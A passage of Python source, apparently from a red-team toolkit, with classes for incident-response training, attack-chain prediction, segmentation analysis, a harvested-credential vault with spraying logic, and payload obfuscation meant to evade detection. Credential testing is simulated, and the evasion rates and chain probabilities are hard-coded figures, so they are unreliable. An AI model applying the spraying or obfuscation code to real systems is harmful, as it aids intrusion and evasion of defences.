        score_impact = self._evaluate_action(action)
        action_record['score_impact'] = score_impact
        action_record['feedback'] = self._generate_feedback(action, score_impact)
        
        self.active_scenario['actions_taken'].append(action_record)
        self.active_scenario['score'] += score_impact
        
        return action_record
    
    def _evaluate_action(self, action: Dict) -> int:
        """Evaluate action and return score impact."""
        action_type = action.get('type', '')
        
        # Score mappings for common actions
        action_scores = {
            'contain': 15,
            'isolate': 20,
            'collect_evidence': 10,
            'document': 5,
            'escalate': 5,
            'communicate': 5,
            'reset_credentials': 15,
            'block_ioc': 10,
            'restore_backup': 20,
            'notify_legal': 10,
            'preserve_logs': 10
        }
        
        base_score = action_scores.get(action_type, 3)
        
        # Timing bonus (early actions score higher)
        actions_count = len(self.active_scenario.get('actions_taken', []))
        timing_bonus = max(0, 5 - actions_count)
        
        return base_score + timing_bonus
    
    def _generate_feedback(self, action: Dict, score: int) -> str:
        """Generate feedback for action."""
        if score >= 15:
            return "Excellent action - key step in incident response"
        elif score >= 10:
            return "Good action - contributes to resolution"
        elif score >= 5:
            return "Acceptable action - consider prioritization"
        else:
            return "Action noted - limited impact on scenario"
    
    def generate_training_report(self) -> str:
        """Generate training scenario report."""
        lines = [
            "=" * 70,
            "üéì INCIDENT RESPONSE TRAINING REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìö Available Scenarios: {len(self.SCENARIOS)}",
            ""
        ]
        
        # Available scenarios
        lines.extend([
            "üìã TRAINING SCENARIOS",
            "‚îÄ" * 40
        ])
        
        diff_icons = {'easy': 'üü¢', 'medium': 'üü°', 'hard': 'üü†', 'expert': 'üî¥'}
        
        for scen_id, scenario in self.SCENARIOS.items():
            icon = diff_icons.get(scenario['difficulty'], '‚ö™')
            lines.append(f"   {icon} {scenario['name']}")
            lines.append(f"      Duration: {scenario['duration_hours']}h | Skills: {', '.join(scenario['skills_tested'][:3])}")
        lines.append("")
        
        # Active scenario status
        if self.active_scenario:
            lines.extend([
                "üéÆ ACTIVE SCENARIO",
                "‚îÄ" * 40,
                f"   Scenario: {self.active_scenario['scenario']['name']}",
                f"   Status: {self.active_scenario['status']}",
                f"   Actions Taken: {len(self.active_scenario['actions_taken'])}",
                f"   Current Score: {self.active_scenario['score']}",
                ""
            ])
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class VulnerabilityChainPredictor:
    """AI-based vulnerability chain prediction system."""
    
    VULNERABILITY_CATEGORIES = {
        'initial_access': {
            'cwe_ids': [89, 79, 287, 306, 798],
            'common_techniques': ['sql_injection', 'xss', 'auth_bypass'],
            'typical_severity': 'high',
            'chain_position': 1
        },
        'execution': {
            'cwe_ids': [78, 94, 502, 434],
            'common_techniques': ['command_injection', 'code_injection', 'file_upload'],
            'typical_severity': 'critical',
            'chain_position': 2
        },
        'privilege_escalation': {
            'cwe_ids': [269, 250, 732],
            'common_techniques': ['suid_abuse', 'sudo_exploit', 'permission_bypass'],
            'typical_severity': 'high',
            'chain_position': 3
        },
        'lateral_movement': {
            'cwe_ids': [522, 256, 319],
            'common_techniques': ['credential_reuse', 'pass_the_hash'],
            'typical_severity': 'high',
            'chain_position': 4
        },
        'data_access': {
            'cwe_ids': [200, 359, 311, 532],
            'common_techniques': ['info_disclosure', 'path_traversal'],
            'typical_severity': 'medium',
            'chain_position': 5
        },
        'persistence': {
            'cwe_ids': [912, 506],
            'common_techniques': ['backdoor', 'webshell', 'rootkit'],
            'typical_severity': 'high',
            'chain_position': 6
        }
    }
    
    CHAIN_PATTERNS = [
        {
            'name': 'Web App to Root',
            'pattern': ['initial_access', 'execution', 'privilege_escalation'],
            'probability': 0.75,
            'impact': 'critical'
        },
        {
            'name': 'Credential Harvest',
            'pattern': ['initial_access', 'data_access', 'lateral_movement'],
            'probability': 0.65,
            'impact': 'high'
        },
        {
            'name': 'Full Compromise',
            'pattern': ['initial_access', 'execution', 'privilege_escalation', 'persistence', 'lateral_movement'],
            'probability': 0.45,
            'impact': 'critical'
        },
        {
            'name': 'Data Exfil',
            'pattern': ['initial_access', 'lateral_movement', 'data_access'],
            'probability': 0.55,
            'impact': 'high'
        }
    ]
    
    def __init__(self):
        self.vulnerabilities = []
        self.predicted_chains = []
        self.historical_chains = []
    
    def add_vulnerability(self, vuln_info: Dict[str, Any]) -> None:
        """Add discovered vulnerability for analysis."""
        self.vulnerabilities.append({
            'id': vuln_info.get('id', str(uuid.uuid4())[:8]),
            'cve': vuln_info.get('cve'),
            'cwe': vuln_info.get('cwe'),
            'name': vuln_info.get('name', 'Unknown'),
            'category': self._categorize_vulnerability(vuln_info),
            'severity': vuln_info.get('severity', 'medium'),
            'cvss': vuln_info.get('cvss', 5.0),
            'exploitability': vuln_info.get('exploitability', 0.5),
            'affected_component': vuln_info.get('component'),
            'confirmed': vuln_info.get('confirmed', False)
        })
    
    def _categorize_vulnerability(self, vuln_info: Dict) -> str:
        """Categorize vulnerability based on CWE or other indicators."""
        cwe = vuln_info.get('cwe')
        
        if cwe:
            for category, info in self.VULNERABILITY_CATEGORIES.items():
                if cwe in info['cwe_ids']:
                    return category
        
        # Fallback to name-based categorization
        name_lower = vuln_info.get('name', '').lower()
        
        if any(k in name_lower for k in ['injection', 'sqli', 'xss']):
            return 'initial_access'
        elif any(k in name_lower for k in ['rce', 'command', 'exec']):
            return 'execution'
        elif any(k in name_lower for k in ['privesc', 'escalat', 'sudo']):
            return 'privilege_escalation'
        elif any(k in name_lower for k in ['credential', 'password', 'hash']):
            return 'lateral_movement'
        elif any(k in name_lower for k in ['disclosure', 'leak', 'traversal']):
            return 'data_access'
        elif any(k in name_lower for k in ['backdoor', 'persist', 'shell']):
            return 'persistence'
        
        return 'initial_access'  # Default
    
    def predict_chains(self) -> List[Dict[str, Any]]:
        """Predict possible vulnerability chains."""
        predictions = []
        
        # Group vulnerabilities by category
        vuln_by_category = {}
        for vuln in self.vulnerabilities:
            cat = vuln['category']
            if cat not in vuln_by_category:
                vuln_by_category[cat] = []
            vuln_by_category[cat].append(vuln)
        
        # Check each pattern
        for pattern in self.CHAIN_PATTERNS:
            chain_vulns = []
            chain_possible = True
            
            for step in pattern['pattern']:
                if step in vuln_by_category and vuln_by_category[step]:
                    # Get highest CVSS vuln for this step
                    best_vuln = max(vuln_by_category[step], key=lambda x: x['cvss'])
                    chain_vulns.append(best_vuln)
                else:
                    chain_possible = False
                    break
            
            if chain_possible:
                # Calculate chain probability
                base_prob = pattern['probability']
                
                # Adjust for exploitability
                exploit_factor = sum(v['exploitability'] for v in chain_vulns) / len(chain_vulns)
                
                # Adjust for confirmation
                confirm_factor = sum(1 for v in chain_vulns if v['confirmed']) / len(chain_vulns)
                
                adjusted_prob = base_prob * (0.5 + exploit_factor * 0.3 + confirm_factor * 0.2)
                
                # Calculate combined CVSS
                combined_cvss = self._calculate_chain_cvss(chain_vulns)
                
                predictions.append({
                    'pattern_name': pattern['name'],
                    'impact': pattern['impact'],
                    'probability': round(adjusted_prob, 3),
                    'vulnerabilities': chain_vulns,
                    'chain_length': len(chain_vulns),
                    'combined_cvss': combined_cvss,
                    'effort_estimate': self._estimate_effort(chain_vulns),
                    'detection_likelihood': self._calculate_detection_likelihood(chain_vulns)
                })
        
        predictions.sort(key=lambda x: -x['probability'] * x['combined_cvss'])
        self.predicted_chains = predictions
        return predictions
    
    def _calculate_chain_cvss(self, vulns: List[Dict]) -> float:
        """Calculate combined CVSS for vulnerability chain."""
        if not vulns:
            return 0.0
        
        # Chain CVSS is based on weakest link theory with severity amplification
        base_cvss = min(v['cvss'] for v in vulns)
        
        # Amplify based on chain length (longer chains = more impact)
        length_bonus = min(len(vulns) * 0.3, 1.5)
        
        # Cap at 10.0
        return min(10.0, base_cvss + length_bonus)
    
    def _estimate_effort(self, vulns: List[Dict]) -> str:
        """Estimate effort required to exploit chain."""
        total_complexity = len(vulns)
        
        # Add complexity for unconfirmed vulns
        unconfirmed = sum(1 for v in vulns if not v['confirmed'])
        total_complexity += unconfirmed * 0.5
        
        # Estimate based on exploitability
        avg_exploit = sum(v['exploitability'] for v in vulns) / len(vulns)
        
        if avg_exploit >= 0.8 and total_complexity <= 3:
            return 'low'
        elif avg_exploit >= 0.5 and total_complexity <= 5:
            return 'medium'
        else:
            return 'high'
    
    def _calculate_detection_likelihood(self, vulns: List[Dict]) -> str:
        """Calculate likelihood of detection during exploitation."""
        # More steps = higher detection chance
        if len(vulns) >= 5:
            return 'high'
        elif len(vulns) >= 3:
            return 'medium'
        else:
            return 'low'
    
    def generate_prediction_report(self) -> str:
        """Generate vulnerability chain prediction report."""
        lines = [
            "=" * 70,
            "üîÆ VULNERABILITY CHAIN PREDICTION REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üîç Vulnerabilities Analyzed: {len(self.vulnerabilities)}",
            f"‚õìÔ∏è Chains Predicted: {len(self.predicted_chains)}",
            ""
        ]
        
        # Vulnerability inventory by category
        lines.extend([
            "üìä VULNERABILITY INVENTORY",
            "‚îÄ" * 40
        ])
        
        cat_counts = {}
        for vuln in self.vulnerabilities:
            cat = vuln['category']
            cat_counts[cat] = cat_counts.get(cat, 0) + 1
        
        for category, info in self.VULNERABILITY_CATEGORIES.items():
            count = cat_counts.get(category, 0)
            icon = "‚úÖ" if count > 0 else "‚ùå"
            lines.append(f"   {icon} {category.replace('_', ' ').title()}: {count}")
        lines.append("")
        
        # Predicted chains
        if self.predicted_chains:
            lines.extend([
                "‚õìÔ∏è PREDICTED ATTACK CHAINS",
                "‚îÄ" * 40
            ])
            
            for chain in self.predicted_chains[:5]:
                impact_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢'}.get(chain['impact'], '‚ö™')
                lines.append(f"   {impact_icon} {chain['pattern_name']}")
                lines.append(f"      Probability: {chain['probability']*100:.1f}% | CVSS: {chain['combined_cvss']:.1f}")
                lines.append(f"      Effort: {chain['effort_estimate']} | Detection: {chain['detection_likelihood']}")
                vuln_names = [v['name'][:20] for v in chain['vulnerabilities']]
                lines.append(f"      Chain: {' ‚Üí '.join(vuln_names)}")
            lines.append("")
        
        lines.extend([
            "üìã RECOMMENDATIONS",
            "‚îÄ" * 40,
            "   1. Prioritize fixing vulnerabilities in predicted chains",
            "   2. Focus on initial access vectors first",
            "   3. Break chains by patching critical links",
            "   4. Implement detection for chain exploitation",
            "",
            "=" * 70
        ])
        
        return "\n".join(lines)


class NetworkSegmentAnalyzer:
    """Analyze network segmentation and trust boundaries."""
    
    SEGMENT_TYPES = {
        'dmz': {'trust_level': 'low', 'exposure': 'high', 'typical_services': ['web', 'dns', 'mail']},
        'internal': {'trust_level': 'medium', 'exposure': 'low', 'typical_services': ['ad', 'file', 'print']},
        'management': {'trust_level': 'high', 'exposure': 'low', 'typical_services': ['ssh', 'rdp', 'snmp']},
        'database': {'trust_level': 'high', 'exposure': 'low', 'typical_services': ['mysql', 'mssql', 'oracle']},
        'development': {'trust_level': 'medium', 'exposure': 'medium', 'typical_services': ['git', 'ci', 'docker']},
        'ot_scada': {'trust_level': 'critical', 'exposure': 'low', 'typical_services': ['modbus', 'dnp3', 'opcua']},
        'cloud': {'trust_level': 'medium', 'exposure': 'medium', 'typical_services': ['api', 'lambda', 'storage']},
        'guest': {'trust_level': 'untrusted', 'exposure': 'high', 'typical_services': ['internet']}
    }
    
    def __init__(self):
        self.segments = {}
        self.trust_relationships = []
        self.firewall_rules = []
        self.segmentation_gaps = []
    
    def add_segment(self, segment_info: Dict[str, Any]) -> str:
        """Add network segment for analysis."""
        segment_id = segment_info.get('id', str(uuid.uuid4())[:8])
        
        segment_type = segment_info.get('type', 'internal')
        type_info = self.SEGMENT_TYPES.get(segment_type, self.SEGMENT_TYPES['internal'])
        
        self.segments[segment_id] = {
            'id': segment_id,
            'name': segment_info.get('name', f'Segment-{segment_id}'),
            'type': segment_type,
            'cidr': segment_info.get('cidr'),
            'vlan': segment_info.get('vlan'),
            'trust_level': type_info['trust_level'],
            'hosts': segment_info.get('hosts', []),
            'services': segment_info.get('services', type_info['typical_services']),
            'controls': segment_info.get('controls', [])
        }
        
        return segment_id
    
    def add_trust_relationship(self, from_segment: str, to_segment: str, 
                               direction: str = 'bidirectional', 
                               ports: List[int] = None) -> None:
        """Add trust relationship between segments."""
        self.trust_relationships.append({
            'from': from_segment,
            'to': to_segment,
            'direction': direction,
            'allowed_ports': ports or [],
            'created': datetime.now().isoformat()
        })
    
    def add_firewall_rule(self, rule: Dict[str, Any]) -> None:
        """Add firewall rule for analysis."""
        self.firewall_rules.append({
            'id': rule.get('id', str(uuid.uuid4())[:8]),
            'source': rule.get('source'),
            'destination': rule.get('destination'),
            'ports': rule.get('ports', []),
            'protocol': rule.get('protocol', 'tcp'),
            'action': rule.get('action', 'allow'),
            'enabled': rule.get('enabled', True)
        })
    
    def analyze_segmentation(self) -> Dict[str, Any]:
        """Analyze network segmentation for weaknesses."""
        analysis = {
            'total_segments': len(self.segments),
            'trust_relationships': len(self.trust_relationships),
            'firewall_rules': len(self.firewall_rules),
            'gaps': [],
            'risks': [],
            'recommendations': []
        }
        
        # Check for overly permissive rules
        for rule in self.firewall_rules:
            if rule['action'] == 'allow' and not rule['ports']:
                analysis['gaps'].append({
                    'type': 'overly_permissive',
                    'rule_id': rule['id'],
                    'description': f"Allow-all rule from {rule['source']} to {rule['destination']}"
                })
        
        # Check for trust boundary violations
        for rel in self.trust_relationships:
            from_seg = self.segments.get(rel['from'])
            to_seg = self.segments.get(rel['to'])
            
            if from_seg and to_seg:
                trust_levels = {'untrusted': 0, 'low': 1, 'medium': 2, 'high': 3, 'critical': 4}
                from_trust = trust_levels.get(from_seg['trust_level'], 0)
                to_trust = trust_levels.get(to_seg['trust_level'], 0)
                
                if to_trust > from_trust + 1:
                    analysis['risks'].append({
                        'type': 'trust_boundary_skip',
                        'from_segment': from_seg['name'],
                        'to_segment': to_seg['name'],
                        'description': f"Direct path from {from_seg['trust_level']} to {to_seg['trust_level']} zone"
                    })
        
        # Check for flat network
        if len(self.segments) < 3:
            analysis['gaps'].append({
                'type': 'insufficient_segmentation',
                'description': 'Network appears to have minimal segmentation'
            })
        
        # Generate recommendations
        if analysis['gaps'] or analysis['risks']:
            analysis['recommendations'].extend([
                'Implement micro-segmentation for critical assets',
                'Review and restrict overly permissive firewall rules',
                'Add jump boxes for crossing trust boundaries',
                'Implement zero-trust network architecture'
            ])
        
        self.segmentation_gaps = analysis['gaps']
        return analysis
    
    def find_attack_paths(self, start_segment: str, target_segment: str) -> List[Dict[str, Any]]:
        """Find possible attack paths between segments."""
        paths = []
        
        # Build adjacency from trust relationships
        adjacency = {}
        for rel in self.trust_relationships:
            if rel['direction'] in ['bidirectional', 'forward']:
                if rel['from'] not in adjacency:
                    adjacency[rel['from']] = []
                adjacency[rel['from']].append(rel['to'])
            
            if rel['direction'] in ['bidirectional', 'reverse']:
                if rel['to'] not in adjacency:
                    adjacency[rel['to']] = []
                adjacency[rel['to']].append(rel['from'])
        
        # Simple BFS to find paths
        def find_paths_bfs(start, end, max_depth=5):
            queue = [(start, [start])]
            found_paths = []
            
            while queue:
                current, path = queue.pop(0)
                
                if current == end:
                    found_paths.append(path)
                    continue
                
                if len(path) >= max_depth:
                    continue
                
                for neighbor in adjacency.get(current, []):
                    if neighbor not in path:
                        queue.append((neighbor, path + [neighbor]))
            
            return found_paths
        
        raw_paths = find_paths_bfs(start_segment, target_segment)
        
        for raw_path in raw_paths:
            path_info = {
                'hops': raw_path,
                'length': len(raw_path),
                'segments_traversed': [self.segments.get(s, {}).get('name', s) for s in raw_path],
                'trust_levels_crossed': [],
                'risk_score': 0
            }
            
            # Calculate trust levels and risk
            for seg_id in raw_path:
                seg = self.segments.get(seg_id)
                if seg:
                    path_info['trust_levels_crossed'].append(seg['trust_level'])
            
            # Shorter paths = higher risk
            path_info['risk_score'] = 100 - (len(raw_path) * 15)
            
            paths.append(path_info)
        
        paths.sort(key=lambda x: -x['risk_score'])
        return paths
    
    def generate_segmentation_report(self) -> str:
        """Generate network segmentation analysis report."""
        analysis = self.analyze_segmentation()
        
        lines = [
            "=" * 70,
            "üî≤ NETWORK SEGMENTATION ANALYSIS REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üî≤ Network Segments: {len(self.segments)}",
            f"üîó Trust Relationships: {len(self.trust_relationships)}",
            f"üõ°Ô∏è Firewall Rules: {len(self.firewall_rules)}",
            ""
        ]
        
        # Segments overview
        lines.extend([
            "üìä NETWORK SEGMENTS",
            "‚îÄ" * 40
        ])
        
        trust_icons = {'untrusted': '‚ö´', 'low': 'üî¥', 'medium': 'üü°', 'high': 'üü¢', 'critical': 'üíé'}
        
        for seg_id, segment in self.segments.items():
            icon = trust_icons.get(segment['trust_level'], '‚ö™')
            lines.append(f"   {icon} {segment['name']} ({segment['type']})")
            lines.append(f"      CIDR: {segment.get('cidr', 'N/A')} | Hosts: {len(segment['hosts'])}")
        lines.append("")
        
        # Gaps and risks
        if analysis['gaps']:
            lines.extend([
                "‚ö†Ô∏è SEGMENTATION GAPS",
                "‚îÄ" * 40
            ])
            for gap in analysis['gaps']:
                lines.append(f"   üî∂ {gap['type'].replace('_', ' ').title()}")
                lines.append(f"      {gap['description']}")
            lines.append("")
        
        if analysis['risks']:
            lines.extend([
                "üö® IDENTIFIED RISKS",
                "‚îÄ" * 40
            ])
            for risk in analysis['risks']:
                lines.append(f"   üî¥ {risk['type'].replace('_', ' ').title()}")
                lines.append(f"      {risk['description']}")
            lines.append("")
        
        # Recommendations
        if analysis['recommendations']:
            lines.extend([
                "üìã RECOMMENDATIONS",
                "‚îÄ" * 40
            ])
            for i, rec in enumerate(analysis['recommendations'], 1):
                lines.append(f"   {i}. {rec}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class CredentialVaultManager:
    """Secure management of harvested credentials."""
    
    CREDENTIAL_TYPES = {
        'password': {'icon': 'üîë', 'value_label': 'Password'},
        'ntlm_hash': {'icon': 'üîê', 'value_label': 'NTLM Hash'},
        'kerberos_ticket': {'icon': 'üéüÔ∏è', 'value_label': 'Ticket'},
        'ssh_key': {'icon': 'üîè', 'value_label': 'Private Key'},
        'api_key': {'icon': 'üîß', 'value_label': 'API Key'},
        'bearer_token': {'icon': 'üé´', 'value_label': 'Token'},
        'cookie': {'icon': 'üç™', 'value_label': 'Cookie'},
        'certificate': {'icon': 'üìú', 'value_label': 'Certificate'},
        'aws_key': {'icon': '‚òÅÔ∏è', 'value_label': 'Access Key'},
        'database': {'icon': 'üóÑÔ∏è', 'value_label': 'DB Credentials'}
    }
    
    def __init__(self):
        self.credentials = {}
        self.access_log = []
        self.spray_attempts = []
        self.successful_auths = []
    
    def add_credential(self, cred_info: Dict[str, Any]) -> str:
        """Add credential to vault."""
        cred_id = str(uuid.uuid4())[:12]
        
        cred_type = cred_info.get('type', 'password')
        type_info = self.CREDENTIAL_TYPES.get(cred_type, self.CREDENTIAL_TYPES['password'])
        
        self.credentials[cred_id] = {
            'id': cred_id,
            'type': cred_type,
            'type_icon': type_info['icon'],
            'username': cred_info.get('username'),
            'domain': cred_info.get('domain'),
            'value': cred_info.get('value'),  # In production, encrypt this
            'source_host': cred_info.get('source_host'),
            'source_method': cred_info.get('source_method', 'unknown'),
            'harvested_time': datetime.now().isoformat(),
            'last_tested': None,
            'valid': None,
            'valid_for_hosts': [],
            'admin_access': cred_info.get('admin', False),
            'notes': cred_info.get('notes', '')
        }
        
        self._log_access('add', cred_id)
        return cred_id
    
    def _log_access(self, action: str, cred_id: str) -> None:
        """Log credential access."""
        self.access_log.append({
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'credential_id': cred_id
        })
    
    def test_credential(self, cred_id: str, target_host: str, 
                       protocol: str = 'smb') -> Dict[str, Any]:
        """Test credential against target (simulation)."""
        cred = self.credentials.get(cred_id)
        if not cred:
            return {'success': False, 'error': 'Credential not found'}
        
        self._log_access('test', cred_id)
        
        # Simulate testing (in real implementation, would actually test)
        result = {
            'credential_id': cred_id,
            'target': target_host,
            'protocol': protocol,
            'tested_time': datetime.now().isoformat(),
            'success': random.random() > 0.3,  # 70% success rate for simulation
            'admin_access': False
        }
        
        if result['success']:
            result['admin_access'] = random.random() > 0.6
            cred['valid'] = True
            cred['last_tested'] = datetime.now().isoformat()
            
            if target_host not in cred['valid_for_hosts']:
                cred['valid_for_hosts'].append(target_host)
            
            if result['admin_access']:
                cred['admin_access'] = True
            
            self.successful_auths.append(result)
        
        return result
    
    def spray_credentials(self, target_hosts: List[str], 
                         protocols: List[str] = None) -> Dict[str, Any]:
        """Spray all credentials against targets."""
        protocols = protocols or ['smb', 'rdp', 'ssh']
        
        spray_result = {
            'started': datetime.now().isoformat(),
            'targets': len(target_hosts),
            'credentials': len(self.credentials),
            'protocols': protocols,
            'successful': [],
            'failed': 0
        }
        
        for cred_id in self.credentials:
            for host in target_hosts:
                for proto in protocols:
                    result = self.test_credential(cred_id, host, proto)
                    if result['success']:
                        spray_result['successful'].append(result)
                    else:
                        spray_result['failed'] += 1
        
        spray_result['completed'] = datetime.now().isoformat()
        spray_result['success_rate'] = (
            len(spray_result['successful']) / 
            (len(spray_result['successful']) + spray_result['failed']) * 100
            if (len(spray_result['successful']) + spray_result['failed']) > 0 else 0
        )
        
        self.spray_attempts.append(spray_result)
        return spray_result
    
    def find_admin_credentials(self) -> List[Dict[str, Any]]:
        """Find all credentials with admin access."""
        return [
            cred for cred in self.credentials.values()
            if cred.get('admin_access', False)
        ]
    
    def get_credentials_by_domain(self, domain: str) -> List[Dict[str, Any]]:
        """Get credentials for specific domain."""
        return [
            cred for cred in self.credentials.values()
            if cred.get('domain', '').lower() == domain.lower()
        ]
    
    def generate_vault_report(self) -> str:
        """Generate credential vault report."""
        lines = [
            "=" * 70,
            "üîê CREDENTIAL VAULT REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üîë Total Credentials: {len(self.credentials)}",
            f"‚úÖ Verified Valid: {sum(1 for c in self.credentials.values() if c['valid'])}",
            f"üëë Admin Access: {len(self.find_admin_credentials())}",
            ""
        ]
        
        # Credentials by type
        lines.extend([
            "üìä CREDENTIALS BY TYPE",
            "‚îÄ" * 40
        ])
        
        type_counts = {}
        for cred in self.credentials.values():
            ctype = cred['type']
            type_counts[ctype] = type_counts.get(ctype, 0) + 1
        
        for cred_type, info in self.CREDENTIAL_TYPES.items():
            count = type_counts.get(cred_type, 0)
            if count > 0:
                lines.append(f"   {info['icon']} {cred_type.replace('_', ' ').title()}: {count}")
        lines.append("")
        
        # High-value credentials
        admin_creds = self.find_admin_credentials()
        if admin_creds:
            lines.extend([
                "üëë ADMIN CREDENTIALS",
                "‚îÄ" * 40
            ])
            for cred in admin_creds[:10]:
                lines.append(f"   {cred['type_icon']} {cred['username']}@{cred['domain'] or 'local'}")
                lines.append(f"      Valid for: {', '.join(cred['valid_for_hosts'][:3])}")
            lines.append("")
        
        # Spray statistics
        if self.spray_attempts:
            lines.extend([
                "üî´ SPRAY STATISTICS",
                "‚îÄ" * 40
            ])
            last_spray = self.spray_attempts[-1]
            lines.append(f"   Last Spray: {len(last_spray['successful'])} successes")
            lines.append(f"   Success Rate: {last_spray['success_rate']:.1f}%")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class PayloadObfuscator:
    """Advanced payload obfuscation techniques."""
    
    OBFUSCATION_TECHNIQUES = {
        'base64': {'complexity': 'low', 'evasion_rate': 0.3},
        'xor': {'complexity': 'low', 'evasion_rate': 0.4},
        'aes_encrypt': {'complexity': 'medium', 'evasion_rate': 0.7},
        'string_split': {'complexity': 'low', 'evasion_rate': 0.35},
        'char_substitution': {'complexity': 'medium', 'evasion_rate': 0.5},
        'dead_code_injection': {'complexity': 'medium', 'evasion_rate': 0.55},
        'control_flow_flattening': {'complexity': 'high', 'evasion_rate': 0.75},
        'opaque_predicates': {'complexity': 'high', 'evasion_rate': 0.7},
        'metamorphic': {'complexity': 'expert', 'evasion_rate': 0.85},
        'polymorphic': {'complexity': 'expert', 'evasion_rate': 0.9}
    }
    
    ENCODING_SCHEMES = {
        'base64': 'Standard Base64 encoding',
        'base32': 'Base32 encoding (alphanumeric)',
        'hex': 'Hexadecimal encoding',
        'url': 'URL encoding',
        'unicode': 'Unicode escape sequences',
        'rot13': 'ROT13 letter substitution',
        'custom_alphabet': 'Custom alphabet substitution'
    }
    
    def __init__(self):
        self.obfuscation_history = []
        self.generated_payloads = []
    
    def obfuscate_string(self, plaintext: str, technique: str = 'base64') -> Dict[str, Any]:
        """Apply obfuscation to string."""
        result = {
            'original': plaintext,
            'technique': technique,
            'timestamp': datetime.now().isoformat()
        }
        
        if technique == 'base64':
            result['obfuscated'] = base64.b64encode(plaintext.encode()).decode()
            result['decoder'] = 'base64.b64decode(payload).decode()'
        
        elif technique == 'xor':
            key = random.randint(1, 255)
            obfuscated = ''.join(chr(ord(c) ^ key) for c in plaintext)
            result['obfuscated'] = base64.b64encode(obfuscated.encode('latin-1')).decode()
            result['key'] = key
            result['decoder'] = f'xor_decode(payload, {key})'
        
        elif technique == 'hex':
            result['obfuscated'] = plaintext.encode().hex()
            result['decoder'] = 'bytes.fromhex(payload).decode()'
        
        elif technique == 'string_split':
            # Split string into chunks and reassemble
            chunk_size = 3
            chunks = [plaintext[i:i+chunk_size] for i in range(0, len(plaintext), chunk_size)]
            result['obfuscated'] = repr(chunks)
            result['decoder'] = '"".join(chunks)'
        
        elif technique == 'char_substitution':
            # Convert to chr() calls
            char_codes = '+'.join(f'chr({ord(c)})' for c in plaintext)
            result['obfuscated'] = char_codes
            result['decoder'] = 'eval(payload)'
        
        else:
            # Default to base64
            result['obfuscated'] = base64.b64encode(plaintext.encode()).decode()
            result['decoder'] = 'base64.b64decode(payload).decode()'
        
        tech_info = self.OBFUSCATION_TECHNIQUES.get(technique, {})
        result['evasion_rate'] = tech_info.get('evasion_rate', 0.3)
        result['complexity'] = tech_info.get('complexity', 'low')
        
        self.obfuscation_history.append(result)
        return result
    
    def chain_obfuscation(self, plaintext: str, techniques: List[str]) -> Dict[str, Any]:
        """Apply multiple obfuscation techniques in sequence."""
        result = {
            'original': plaintext,
            'techniques': techniques,
            'layers': [],
            'timestamp': datetime.now().isoformat()
        }
        
        current = plaintext
        combined_evasion = 1.0
        
        for technique in techniques:
            layer_result = self.obfuscate_string(current, technique)
            result['layers'].append({
                'technique': technique,
                'input_length': len(current),
                'output_length': len(layer_result['obfuscated']),
                'evasion_rate': layer_result['evasion_rate']
            })
            current = layer_result['obfuscated']
            combined_evasion *= (1 - layer_result['evasion_rate'])
        
        result['final_obfuscated'] = current
        result['combined_evasion_rate'] = round(1 - combined_evasion, 3)
        result['size_increase'] = f"{len(current) / len(plaintext):.1f}x"
        
        return result
    
    def generate_payload_variants(self, base_payload: str, count: int = 5) -> List[Dict[str, Any]]:
        """Generate multiple variants of a payload."""
        variants = []
        
        technique_combos = [
            ['base64'],
            ['xor', 'base64'],
            ['string_split'],
            ['char_substitution'],
            ['hex', 'base64'],
            ['xor', 'hex'],
            ['base64', 'xor', 'base64']
        ]
        
        for i in range(min(count, len(technique_combos))):
            techniques = technique_combos[i]
            variant = self.chain_obfuscation(base_payload, techniques)
            variant['variant_id'] = i + 1
            variants.append(variant)
        
        self.generated_payloads.extend(variants)
        return variants
    
    def generate_obfuscation_report(self) -> str:
        """Generate payload obfuscation report."""
        lines = [
            "=" * 70,
            "üé≠ PAYLOAD OBFUSCATION REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üîÑ Obfuscations Performed: {len(self.obfuscation_history)}",
            f"üì¶ Payload Variants Generated: {len(self.generated_payloads)}",
            ""
        ]
        
        # Available techniques
        lines.extend([
            "üõ†Ô∏è OBFUSCATION TECHNIQUES",
            "‚îÄ" * 40
        ])
        
        for tech_id, tech_info in self.OBFUSCATION_TECHNIQUES.items():
            complexity_icon = {
                'low': 'üü¢', 'medium': 'üü°', 'high': 'üü†', 'expert': 'üî¥'
            }.get(tech_info['complexity'], '‚ö™')
            evasion_pct = tech_info['evasion_rate'] * 100
            lines.append(f"   {complexity_icon} {tech_id.replace('_', ' ').title()}")
            lines.append(f"      Complexity: {tech_info['complexity']} | Evasion: {evasion_pct:.0f}%")
        lines.append("")
        
        # Recent obfuscations
        if self.obfuscation_history:
            lines.extend([
                "üìú RECENT OBFUSCATIONS",
                "‚îÄ" * 40
            ])
            for obf in self.obfuscation_history[-5:]:
                lines.append(f"   üîÑ {obf['technique'].replace('_', ' ').title()}")
                lines.append(f"      Original: {len(obf['original'])} chars ‚Üí Obfuscated: {len(obf['obfuscated'])} chars")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class CampaignManager:
    """Manage red team campaigns and operations."""
    
    CAMPAIGN_PHASES = [
        'reconnaissance',
        'weaponization',
        'delivery',
        'exploitation',
        'installation',
        'command_and_control',
        'actions_on_objectives'
    ]
    
    OBJECTIVE_TYPES = {
        'data_exfil': {'name': 'Data Exfiltration', 'icon': 'üì§'},
        'persistence': {'name': 'Establish Persistence', 'icon': 'üîó'},
        'privilege_escalation': {'name': 'Privilege Escalation', 'icon': '‚¨ÜÔ∏è'},
        'lateral_movement': {'name': 'Lateral Movement', 'icon': '‚ÜîÔ∏è'},
        'credential_harvest': {'name': 'Credential Harvesting', 'icon': 'üîë'},
        'domain_dominance': {'name': 'Domain Dominance', 'icon': 'üëë'},
